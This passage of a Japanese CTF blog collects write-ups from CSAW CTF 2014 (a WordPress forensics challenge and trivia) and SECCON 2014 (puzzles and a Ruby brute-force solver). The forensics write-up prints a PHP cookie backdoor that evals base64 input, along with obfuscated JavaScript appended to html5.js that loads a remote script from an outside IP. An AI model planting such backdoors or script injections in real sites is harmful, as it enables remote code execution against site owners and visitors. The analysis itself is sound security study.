</span><span class='line'>if (reset($a) == 'ha' && $c($a) &gt; 3) {
</span><span class='line'>  $k='ckit';
</span><span class='line'>  echo '&lt;'.$k.'&gt;';
</span><span class='line'>  eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));
</span><span class='line'>  echo '&lt;/'.$k.'&gt;';
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Cookieが所定の条件を満たすとき、その中に入っているBase64文字列をevalする、というコードのようです。どう見てもバックドアです。本当にありがとうございました。</p>

<p>しかし、ログに記録されてない上にパケットキャプチャもないので、Cookieの中身はわかりません。つまりどんなコードが実行されたのかが全く不明です。データベースの中に何かしら残っていないか探してみましたが見つかりません。ここで一旦手詰まりとなってしまいました。</p>

<p>そこで隣に座ってた某氏が&#8217;/var/log/auth.log&#8217;を見ていて次の箇所を指摘しました。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Sep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js</span></code></pre></td></tr></table></div></figure>


<p>ご覧の通り、sudoでviが実行されています。察し。……ていうかubuntuユーザーでログインされてsudoまでされてるんですがそれは……。</p>

<p>それはともかく/wp-content/themes/twentythirteen/js/html5.jsを見てみます。先頭のコメントにHTML5 Shivとあります。バージョンは3.7.0。<a href="https://github.com/aFarkas/html5shiv">HTML5Shivのリポジトリ</a>から3.7.0のファイルをダウンロードし、このファイルとの差異を探すと、末尾に次のコードが追加されていました。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>var g="ti";var c="HTML Tags";var f=". li colgroup br src datalist script option .";f = f.split(" ");c="";k="/";m=f[6];for(var i=0;i&lt;f.length;i++){c+=f[i].length.toString();}v=f[0];x="\'ht";b=f[4];f=2541*6-35+46+12-15269;c+=f.toString();f=(56+31+68*65+41-548)/4000-1;c+=f.toString();f="";c=c.split("");var w=0;u="s";for(var i=0;i&lt;c.length;i++){if(((i==3||i==6)&&w!=2)||((i==8)&&w==2)){f+=String.fromCharCode(46);w++;}f+=c[i];} i=k+"anal"; document.write("&lt;"+m+" "+b+"="+x+"tp:"+k+k+f+i+"y"+g+"c"+u+v+"j"+u+"\'&gt;\&lt;/"+m+"\&gt;");</span></code></pre></td></tr></table></div></figure>


<p><a href="http://jsbeautifier.org/">beautify</a>してみます。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>var g = "ti";
</span><span class='line'>var c = "HTML Tags";
</span><span class='line'>var f = ". li colgroup br src datalist script option .";
</span><span class='line'>f = f.split(" ");
</span><span class='line'>c = "";
</span><span class='line'>k = "/";
</span><span class='line'>m = f[6];
</span><span class='line'>for (var i = 0; i &lt; f.length; i++) {
</span><span class='line'>    c += f[i].length.toString();
</span><span class='line'>}
</span><span class='line'>v = f[0];
</span><span class='line'>x = "\'ht";
</span><span class='line'>b = f[4];
</span><span class='line'>f = 2541 * 6 - 35 + 46 + 12 - 15269;
</span><span class='line'>c += f.toString();
</span><span class='line'>f = (56 + 31 + 68 * 65 + 41 - 548) / 4000 - 1;
</span><span class='line'>c += f.toString();
</span><span class='line'>f = "";
</span><span class='line'>c = c.split("");
</span><span class='line'>var w = 0;
</span><span class='line'>u = "s";
</span><span class='line'>for (var i = 0; i &lt; c.length; i++) {
</span><span class='line'>    if (((i == 3 || i == 6) && w != 2) || ((i == 8) && w == 2)) {
</span><span class='line'>        f += String.fromCharCode(46);
</span><span class='line'>        w++;
</span><span class='line'>    }
</span><span class='line'>    f += c[i];
</span><span class='line'>}
</span><span class='line'>i = k + "anal";
</span><span class='line'>document.write("&lt;" + m + " " + b + "=" + x + "tp:" + k + k + f + i + "y" + g + "c" + u + v + "j" + u + "\'&gt;\&lt;/" + m + "\&gt;");</span></code></pre></td></tr></table></div></figure>


<p>このコードをnodeに与えて、<code>document.write</code>の引数になっている文字列を見てみると次のようになります。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script src='http://128.238.66.100/analytics.js'&gt;&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>


<p>つまりhtml5.jsが実行されると&#8217;<a href="http://128.238.66.100/analytics.js">http://128.238.66.100/analytics.js</a>&#8216;が読まれて実行されるわけです。ここにアクセスしてanalytics.jsを見てみます（長いので中身は省略します）。すると、明らかにおかしな箇所がありました。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>var _0x91fe = ["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66", "\x5F\x73\x65\x6C\x66", "\x6F\x70\x65\x6E"];
</span><span class='line'>window[_0x91fe[2]](_0x91fe[0], _0x91fe[1]);</span></code></pre></td></tr></table></div></figure>


<p><code>_0x91fe</code>に代入している箇所をnodeに与えて中身を見てみます。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&gt; var _0x91fe = ["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66", "\x5F\x73\x65\x6C\x66", "\x6F\x70\x65\x6E"];
</span><span class='line'>undefined
</span><span class='line'>&gt; _0x91fe
</span><span class='line'>[ 'http://128.238.66.100/announcement.pdf',
</span><span class='line'>  '_self',
</span><span class='line'>  'open' ]</span></code></pre></td></tr></table></div></figure>


<p>これを踏まえた上で先のコードの2行目を見れば、<code>window['open']</code>(<code>window.open</code>関数)で&#8217;<a href="http://128.238.66.100/announcement.pdf">http://128.238.66.100/announcement.pdf</a>&#8216;を開いていることになります。</p>

<p>&lsquo;<a href="http://128.238.66.100/announcement.pdf">http://128.238.66.100/announcement.pdf</a>&#8216;は実際にPDFで、なんかビジュアル系バンドっぽい人物の写真に&#8217;I AM HACKING YOU RIGHT NOW&#8217;という文が書いてある画像があるだけのPDFです。</p>

<p>ひとしきりここで爆笑して作業に戻りますと、pdfextractでストリームデータをダンプしてみるように言われました。-sオプションを使ってストリームをダンプします。結果として&#8217;stream_{1,2,3,8}.dmp&#8217;の4つのファイルが現れます。これらに対してひとまずstringsをしてみます（ていうか先にfileで見てみるべきだったかもしれない）。すると&#8217;stream_8.dmp&#8217;に何か書かれています。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];</span></code></pre></td></tr></table></div></figure>


<p>JavaScriptっぽいのでnodeに与えてみます。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&gt; var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
</span><span class='line'>undefined
</span><span class='line'>&gt; _0xee0b
</span><span class='line'>[ 'YOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy}' ]</span></code></pre></td></tr></table></div></figure>


<p>というわけで無事にフラグを得ることができました。</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/09/22/csawctf2014-trivia/">CSAW CTF 2014 Quals Trivia</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-09-22T20:18:08+09:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>CSAW CTF 2014 Qualsに参加してました。日本時間で20日07:00から22日07:00までの48時間。都内某所に泊まり込みでした。そんな感じでWrite-upでございます。この記事はTrivia。</p>

<p>Triviaは全て10点で全6問。うち私が解答したのは3問でした。</p>

<h1>Shameless plug</h1>

<h2>問題文</h2>

<p>This is the name of the new USENIX workshop that featured papers on CTFs being used for education.</p>

<h2>解答</h2>

<p>Answer: 3GSE</p>

<p>&ldquo;USENIX workshop CTF&#8221;でググると&#8221;The Fun and Future of CTF | USENIX&#8221;というのが最初に出てきます。このpaperの投稿先が3GSE &lsquo;14でした。</p>

<h1>We don&rsquo;t know either</h1>

<h2>問題文</h2>

<p>On this day in November, the CSAW Career Fair takes place in Brooklyn, New York.</p>

<h2>解答</h2>

<p>Answer: 14</p>

<p>CSAWのページ（CTFでない）に行くとイベントの中にCareer Fairがあります。そのイベントページに行ってRegistrationのリンクを辿るとNov 13 - Nov 15で何かやってるらしいことがわかります。</p>

<h1>Twitter will you give me @kchung?</h1>

<h2>問題文</h2>

<p>This is the Twitter handle of the student who runs CSAW CTF.</p>

<h2>解答</h2>

<p>Answer: poopsec</p>

<p>&ldquo;kchung&#8221;というのはCSAW CTFの中の人のひとり、Kevin Chung氏。ところがTwitterで@kchungは別の誰かが取っています。彼自身がTwitterで使っている名前が答えなのでTwitterのアカウントを探します。</p>

<p>とりあえず&#8221;Kevin Chung&#8221;でググってみると同姓同名の人物のプロフィールやら何やらが見つかりますが、その中にcodekevin.comというサイトがあります。これが彼のWebサイトで、ここにTwitterのホームへのリンクがあります。</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/07/20/seccon2014-online-preliminary/">SECCON 2014 オンライン予選 その他諸々</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-07-20T19:24:34+09:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>2014-07-19 09:00 - 21:00に行われたSECCON 2014 オンライン予選について、その他諸々。</p>

<p>個別に書いたのは次の2つ。</p>

<ul>
<li><a href="/blog/2014/07/20/seccon2014-online-amida/">あみだくじ</a></li>
<li><a href="/blog/2014/07/20/seccon2014-online-printit/">Print it</a></li>
</ul>


<p>この2つとここで書かれていないのは問題見てすらいません˙꒳˙</p>

<h2>decode me</h2>

<p>ダウンロードした<code>encoded.txt</code>を見ると盛大に文字化けしてるんだけど、<code>FRPPBA 2014</code>という文字を見た瞬間にここが<code>SECCON 2014</code>であることを確信。ということは換字式暗号か何かなんだろうけど、<code>ebg13/47</code>という文字が気になる。とここで@re_Ordが「rot13/47というのがあるらしい」。なんじゃそりゃと思って調べてみると、rot13を拡張したそういう暗号があるらしかった。</p>

<p>rot13/47はnkfコマンドで簡単に変換出来るので、それを実行しておしまい。</p>

<h2>ソーシャルハック？</h2>

<p>私はページを開いて「天安門事件」って入力したら即座に退出されてしまったのであんまり遊んでません。</p>

<h2>捏造された契約書を暴け</h2>

<p>降ってきたファイルを展開すると<code>Timestamp.dd</code>というファイルが得られる。ここから特定の日付以降になってるようなファイルを探す。日付だから年が入ってるだろうと思って、マウントして云々とかは一切せずに<code>strings Timestamp.dd | grep 2012</code>とかやると1つだけ結果が出てくる。</p>

<p>……で、300点問題だし、まさかそんなわけないよねー、と思ってそれをスルーしてマウントして探し始めたところ、隣で@yuscarletがこの問題を通していた。正解はまさかの先ほど<code>strings</code>やって出てきた日付だったらしい。</p>

<p>よくわかんなくてもとりあえず送信しておくべきですね（白目）</p>

<h2>重ねてみよう</h2>

<p>チーム複数人でまずImageMagickでgif画像を分解して合成云々で粘っていた。これ合成したらQRコードとか出てくるんだろとか思っていたら実際に出てきたのはQRコードでした。</p>

<p>ちなみに、ImageMagickでgif画像を分解、色を反転、透過色を設定……ってやったけどどうにも合成が上手く行ってなかったらしい。で、最終的に取った手段は透過色の設定までやった画像ファイルを全部GIMPに突っ込んでレイヤーとして開き、一番下に白一色のレイヤーを追加するという方法でした。GIMP最強じゃん（</p>

<h2>詰将棋</h2>

<p>突然のurandom将棋部発足。私は何もしてません（</p>

<p>盤面をにらめっこして頭の中で考えるよりも、適当な紙を用意して駒と盤面作った方がよかったようです。</p>

<h2>諸々</h2>

<p>チーム内連携で解けた割と問題があって、今回は結構みんな神が降りていた気がします。ググれる文鎮とは私のことだ！（迫真）</p>

<p>最後の1時間くらい、他のメンバーがDecrypt it!を解いている間に祈っていたら、どうやら全国行けるようです。最後の瞬間のランキングを確認してないんですがひょっとしたらチーム1位かもしれません。やったね。</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/07/20/seccon2014-online-printit/">SECCON 2014 オンライン予選 【Print It!】</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-07-20T18:53:55+09:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>2014-07-19 09:00 - 21:00に行われたSECCON 2014 オンライン予選のWrite-upです。次は「Print it!」。</p>

<h2>問題概要</h2>

<p>謎のファイルが降ってきます。以上。</p>

<h2>解法</h2>

<p>降ってきたファイルの正体は&#8221;Standard Triangulated Language&#8221;というフォーマットのファイル(参考: <a href="http://ja.wikipedia.org/wiki/Standard_Triangulated_Language">Wikipedia</a>)で、このフォーマットのバイナリ形式で記録された3Dモデルです。このファイルを適切なアプリケーションで開くと3Dモデルを見ることが出来て、そのモデルにフラグが書かれています。</p>

<p>ans: <code>Bar1kaTaLab.</code></p>

<h2>経緯</h2>

<p>とりあえずファイルをバイナリエディタに突っ込んでビットマップで見てみると、かなり規則性の高いらしいということはわかったのですが、それ以上のことはさっぱりわからず。nullが14個くらい続いてたりとか、それが繰り返されてたりとか、その辺の規則性が高いわりに、先頭には普通にテキストが入っているし、テキストの間にはまたもnullが入っていてよくわかんないなぁと思ってました。</p>

<p>先頭のテキストには意味がないんじゃないかと思って削ってみても、削った後の先頭数バイトが何かのシグネチャになってるわけではありませんでした。あと、前述のnullが続いている箇所がかなり多いことから圧縮されているわけでもなさそうだということはわかりました。</p>

<p>問題名がPrint it!なので、きっと何かにPrintするんだろうと思って、仮想プリンタドライバにlprコマンドでデータを送りつけても何も起きませんでした。他に&#8221;Print&#8221;に関係しそうなファイルフォーマットを考えてみましたが、たいていがテキスト形式のもので、問題ファイルとは噛み合いません。あとpbcopyでコピーしてコンソールに無理矢理突っ込んだらえらい目にあいました。</p>

<p>じゃあテキストに意味があるのだろうと思って削らないままで眺めてみると、先頭のテキスト（＋謎データ）群のサイズがちょうど80bytesでした（&#8221;Thanks!&ldquo;で終わっていたので切れ目はわかりやすかった）。80byte、やたらキリがいい。そんな話を@6f70として、じゃあきっと先頭80bytesは何かしらのヘッダーに違いない！　……ということで、先頭80bytesがヘッダになってるようなファイルフォーマットを探すと……</p>

<p><img src="/images/seccon2014-printit-google.png"></p>

<p>……なるほどね（白目）</p>

<p>これほどまでに検索結果のスニペットが欲しい情報をピンポイントで持ってきたことはもはや感動的ですらあるので引用しておくと</p>

<blockquote><p>米国のスリーディー・システムズ（英語版）によって開発された三次元CADソフト用の<strong>ファイルフォーマットシステム</strong>。多くのソフトにサポートされ &#8230; バイナリーSTLファイルは<strong>80バイト</strong>の任意の文字列で開始される（通常内容は無視される。ただし、 solid から記載を  &#8230;</p></blockquote>


<p>そんなわけで、このファイルフォーマットのバイナリ形式では先頭80bytesは無視されること、このフォーマットはfloatの値がずらーっと並んでいることがわかりました。floatの値が並んでいるだけなら、確かにデータに規則性があって、nullが連続しているのも納得です。</p>

<p>私のマシンにはこれを見られるものがなかったので、Wikipediaの記事の外部リンクにあった3DViewというChromeのアプリを入れてファイルを読むことで解答が得られました。</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/07/20/seccon2014-online-amida/">SECCON 2014 オンライン予選 【あみだくじ】</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-07-20T00:29:19+09:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>2014-07-19 09:00 - 21:00に行われたSECCON 2014 オンライン予選のWrite-upです。今回は「あみだくじ」。</p>

<h2>問題概要</h2>

<p>問題は64bit ELF形式の実行ファイル<code>amida</code>。これを実行すると「No.i」(i = 1, 2, &hellip;)と書かれた行に続けて1から順に番号が振られたあみだくじが表示され、いずれかの終端の1箇所に*印がついている。……が、後になると</p>

<ul>
<li>番号の振り方が逆 (左から1, 2, &hellip;ではなく8, 7, &hellip;になっている)</li>
<li>そもそもくじの上下が逆</li>
<li>各行の先頭にnull文字が突っ込まれている <ins datetime="2014-07-22T10:21:00+09:00">（追記: これは出題者の意図していない、問題プログラムのバグだった模様）</ins></li>
<li>くじの縦線の間が広がる</li>
<li>くじが横向きになる</li>
</ul>


<p>……といった面白形式で表示されるようになります。具体例は最後に書いてあるのでそちらを。</p>

<h2>解法</h2>

<p>問題を確認せずに1から順に解答してみる。</p>

<p>やることとしては、次の手順をフラグが得られるまで繰り返します。</p>

<ol>
<li><code>amida</code>は問題を出力した後<code>?</code>という文字を出力して入力待ちに入るのでそれが見つかるまで読み捨てる</li>
<li>次の解答を試す</li>
<li>正解ならその番号を記録して、試行する番号を1にリセット。次の問題へ。</li>
<li>不正解なら<code>amida</code>は<code>Wrong</code>を出力して終了するので、<code>amida</code>を再び立ち上げて、これまでの正解番号を次々に入力して、失敗したところまで進める。</li>
</ol>


<p>なお、実際には問題の記録のために問題は読み捨てるのではなく、読んだものをファイルに保存しました。</p>

<p>この方針の提案と、この後に行うソルバの実装は@yuscarletがC++で、amidaとソルバの間を適当に受け持つ部分をRubyで私が実装しました。最終的に使用した総当たり方式はRubyのみで実装しました。</p>

<p>ところでamidaの実行ファイルなんですが、異様に問題出力が遅いんですね。私と@yuscarletが順当（？）にプログラム書いてる一方で@6f70が<code>amida</code>のプログラムを解析していて、それによって「問題数は1000問であること」、「問題を出力する際に<code>sleep</code>が噛まされている」ということがわかりました。そこで彼が問題を出力するときに挟まっている<code>sleep</code>を潰したバイナリを用意して、それを用いて総当たり法を実行。結果としてプログラムを動かしてから5分かそこらくらいでフラグを得ました。</p>

<p>ans: <code>c4693af1761200417d5645bd084e28f0f2b426bf</code></p>

<h2>その他諸々</h2>

<p>一旦この総当たり方式で実装してみたんですが、どうにも上手く行かなかった（問題の終了判定が上下が逆転しているケースに対応していなかったり諸々）のとさすがにあまりにも遅かったので（この原因は上述の<code>sleep</code>）ソルバで真っ正面から解いてみようということになりました。</p>

<p>（※最初は1行ずつ読んで判定していたので上手く行きませんでした。ソルバによる解答を諦めた後に1文字ずつ読めばいいことに気がついて上述の解答となりました）</p>

<p>番号やらくじの向きやら幅やらが変わっていることに気がつく度にソルバやらRubyのプログラムやらを修正していたんですが、51番目でくじが横向きになっているのがわかると「こんな調子でいろんなパターン対応してたらキリがない」として、ソルバによる解答を放棄して、最初の総当たり方式に戻しました（ちなみに他の方のwrite-upを読むとどうやら100問目までで全パターンが出ていた模様）。</p>

<p>あと番号が逆とかくじの上下が逆とかはともかくとして、null文字突っ込まれてるのは最高にタチが悪いと思いました（小並感）。これ、ソルバによる解答をしているときに遭遇してめちゃくちゃ悩んでて、最終的に問題をファイルに保存してvimで眺めるまでわかりませんでした。</p>

<p>それと1000問あるらしいということと<code>sleep</code>が入っていることがわかったのは結構大きかったですね。前者がわかっていたことでソルバによる対応を諦める判断をすぐに下せましたし、後者が判明していたこと、かつそれを潰せたことで、解答にかかる時間をかなり短縮出来ました。</p>

<h2>コード</h2>

<p><a href="https://gist.github.com/mayth/f162efa8dc06cd05e5e3">gist</a></p>

<figure class='code'><figcaption><span> (amida.rb)</span> <a href='/downloads/code/amida.rb'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="k">def</span> <span class="nf">read_problem</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
</span><span class='line'>  <span class="n">problem</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span><span class='line'>  <span class="kp">loop</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">ch</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">getc</span>
</span><span class='line'>    <span class="k">break</span> <span class="k">if</span> <span class="o">!</span><span class="n">ch</span> <span class="o">||</span> <span class="n">ch</span> <span class="o">==</span> <span class="s1">&#39;?&#39;</span>
</span><span class='line'>    <span class="n">problem</span> <span class="o">&lt;&lt;</span> <span class="n">ch</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">io</span><span class="o">.</span><span class="n">getc</span>
</span><span class='line'>  <span class="n">problem</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="n">answers</span> <span class="o">=</span> <span class="o">[]</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">playback</span><span class="p">(</span><span class="n">answers</span><span class="p">,</span> <span class="n">io</span><span class="p">)</span>
</span><span class='line'>  <span class="n">answers</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">ans</span><span class="o">|</span>
</span><span class='line'>    <span class="n">read_problem</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">puts</span> <span class="n">ans</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">flush</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="n">n</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'><span class="n">pnum</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'><span class="kp">loop</span> <span class="k">do</span>
</span><span class='line'>  <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;|./amida_mod&#39;</span><span class="p">,</span> <span class="s1">&#39;a+&#39;</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">io</span><span class="o">|</span>
</span><span class='line'>    <span class="n">playback</span><span class="p">(</span><span class="n">answers</span><span class="p">,</span> <span class="n">io</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="kp">loop</span> <span class="k">do</span>
</span><span class='line'>      <span class="n">problem</span> <span class="o">=</span> <span class="n">read_problem</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
</span><span class='line'>      <span class="no">IO</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;amida2_problem_</span><span class="si">#{</span><span class="n">pnum</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">problem</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">io</span><span class="o">.</span><span class="n">puts</span> <span class="n">n</span>
</span><span class='line'>      <span class="n">io</span><span class="o">.</span><span class="n">flush</span>
</span><span class='line'>      <span class="n">result</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">gets</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">result</span><span class="o">.</span><span class="n">include?</span><span class="p">(</span><span class="s1">&#39;Wrong&#39;</span><span class="p">)</span>
</span><span class='line'>        <span class="n">n</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>      <span class="k">elsif</span> <span class="o">!</span><span class="n">result</span><span class="o">.</span><span class="n">include?</span><span class="p">(</span><span class="s1">&#39;No.&#39;</span><span class="p">)</span>
</span><span class='line'>        <span class="nb">puts</span> <span class="s2">&quot;&gt;&gt;&gt; </span><span class="si">#{</span><span class="n">result</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>      <span class="n">answers</span> <span class="o">&lt;&lt;</span> <span class="n">n</span>
</span><span class='line'>      <span class="n">n</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>      <span class="nb">puts</span>
</span><span class='line'>      <span class="nb">warn</span> <span class="s2">&quot;solved: </span><span class="si">#{</span><span class="n">pnum</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span class='line'>      <span class="n">pnum</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<h2>問題例</h2>

<p><a href="https://gist.github.com/mayth/56bde157140dd52e260c">gist</a></p>

<figure class='code'><figcaption><span>Problem Samples </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
